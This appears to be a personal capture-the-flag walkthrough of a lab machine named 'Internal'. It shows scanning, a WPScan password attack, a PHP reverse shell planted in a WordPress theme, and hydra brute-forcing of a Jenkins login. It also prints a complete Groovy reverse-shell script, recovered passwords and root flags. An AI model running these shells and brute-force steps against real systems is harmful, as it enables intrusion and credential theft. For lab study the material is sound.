# Internal

>Vadim Polovnikov | November 14, 2020

## Port-Scanning and Services Enumeration

---

1. **Nmap**

```txt
# Nmap 7.80 scan initiated Thu Nov 12 14:45:44 2020 as: nmap -sV -O -p 22,80 -T4 -oN basic_scan.nmap 10.10.32.52
Nmap scan report for 10.10.32.52
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
>Ports 22 and 80 are open.


2. **Nikto**

```txt
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.165.59
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
+ OPTIONS Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ GET Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ GET /phpmyadmin/: phpMyAdmin directory found
+ GET Cookie wordpress_test_cookie created without the httponly flag
+ GET /blog/wp-login.php: Wordpress login found
```
>The wordoress login page is found under /blog/wp-login.php

3. **WPScan**

- _kali#wpscan --url http:ip-addr/blog --enumerate u_
- _kali# wpscan --url http://ip-addr/blog --username admin --password /usr/share/wordlists/rockyou.txt_

```txt
...
[+] XML-RPC seems to be enabled: http://10.10.165.59/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.165.59/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.165.59/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.165.59/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.165.59/wordpress/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==================================================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - admin / my2boys
```

Users' credentials enumeration via [xmlprc](https://protector47.medium.com/how-to-hack-wordpress-website-via-xmlrpc-php-61c813fa3740)


## WordPress Fingerprinting and Exploitation

---

WordPress version 5.4.2

**Posts**

(no title) - Private

```txt
To-Do

Don't forget to reset Will's credentials. william:arnold147
```

**PHP Reverse-Shell via Themes Vulnerability**

Appearance > Theme Editor > 404 Template: pentestmonkey [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Triggering reverse-shell:

>http://ip-addr/blog/wp-content/themes/twentyseventeen/404.php

_kali#nc -lvnp 1234_

```txt
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.76.3.
Ncat: Connection from 10.10.76.3:53682.
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:13:02 up  1:39,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

**_Interesting files:_**

1. _/var/lib/phpmyadmin/blowfish_secret.inc.php_

```php
$cfg['blowfish_secret'] = '6wqoJ$mf_Wv($r?g$l4+#P#lAoCVVUM3'
```

2. _/etc/phpmyadmin/htapasswd.setup_

```txt
admin:*
```

3. _/etc/phpmyadmin/config-db.php_

```php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

4. /opt/wp-save.txt

```txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

## Access the Target

---

_kali#ssh aubreanna@ip-addr_

**Interesting Files:**

1. _/home/aubreanna/user.txt_

```txt
THM{int***1}
```

2. _/home/aubreanna/jenkins.txt_

```txt
Internal Jenkins service is running on 172.17.0.2:8080
```

### Connecting to the Remote Jenkins Server

**_aubreanna@internal: netstat -tulpn_**

```txt
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44127         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.96.232:68         0.0.0.0:*   
```

**Fingerprinting the 127.0.0.1:8080 connection:**

_aubreanna@internal: curl -X GET http://ip-addr:8080

```txt
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


Authentication required
<!--
You are authenticated as: anonymous
Groups that you are in:
  
Permission you need to have (but didn't): hudson.model.Hudson.Read
 ... which is implied by: hudson.security.Permission.GenericRead
 ... which is implied by: hudson.model.Hudson.Administer
-->

</body></html>
```

Seems like the **_Local SSH Port Forwarding_** is enabled on the machine.

**On localhost:**

_kali: ssh -L 8080:127.0.0.1:8080 aubreanna@ip-addr_

**In the Firefox:**

_http://127.0.0.1:8080_ <-- Remote Jenkins Server Connection via SSH Local Port Forwarding through the aubreanna@ip-addr tunnel

**Login Page Brute-Forcing:**

_kali: hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 30 127.0.0.1 -s 8080 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password'_

```txt
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 18:47:51
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[STATUS] 459.00 tries/min, 459 tries in 00:01h, 14343940 to do in 520:51h, 30 active
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 18:50:02
```

## Jenkins 

---

**Go to:**

Manage Jenkins > Script Console

_**Paste [Java Reverse-Shell Groovy Script](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)**_

```java
String host="localhost";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Inside the Jenkins Server

```txt
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.96.232.
Ncat: Connection from 10.10.96.232:40550.
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

cd opt 
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

### Privilege Escalation

aubreanna@internal: su

Password: tr0ub13guM!@#123

root@internal: ls

```txt
root.txt
```

root@internal: ls

cat root.txt

```txt
THM{d0ck3***r}
```
